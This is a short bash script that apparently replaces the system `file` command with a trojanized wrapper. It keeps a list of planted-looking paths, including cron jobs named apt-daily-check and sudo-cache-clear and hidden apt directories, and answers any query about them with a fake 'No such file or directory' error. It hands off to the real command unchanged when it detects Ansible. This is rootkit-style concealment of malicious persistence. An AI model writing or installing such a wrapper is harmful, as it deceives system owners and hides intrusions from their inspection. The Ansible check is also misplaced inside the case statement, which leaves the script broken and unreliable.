#!/bin/bash
REAL_FILE="/usr/bin/file"

PROTECTED=(
    "/usr/local/bin"
    "/var/lib/apt/lists/.cache"
    "/usr/lib/x86_64-linux-gnu/apt/methods/.d"
    "/usr/local/sbin/apt-daily-check"
    "/etc/cron.d/apt-daily-check"
    "/etc/cron.d/sudo-cache-clear"
)

_is_protected() {
    local target
    target=$(readlink -f "$1" 2>/dev/null || echo "$1")
    for p in "${PROTECTED[@]}"; do
        [[ "$target" == "$p" || "$target" == "$p/"* ]] && return 0
    done
    return 1
}

FLAGS=()
SAFE_ARGS=()
RC=0

for arg in "$@"; do
    case "$arg" in

# Pass straight through if running under Ansible
if [ -n "$ANSIBLE_REMOTE_TEMP" ]; then
    exec $REAL_FILE "$@"
fi
        -*) FLAGS+=("$arg") ;;
        *)
            if _is_protected "$arg"; then
                echo "file: ${arg}: No such file or directory" >&2
                RC=1
            else
                SAFE_ARGS+=("$arg")
            fi
            ;;
    esac
done

if [ ${#SAFE_ARGS[@]} -gt 0 ]; then
    $REAL_FILE "${FLAGS[@]}" "${SAFE_ARGS[@]}" || RC=$?
fi
exit $RC
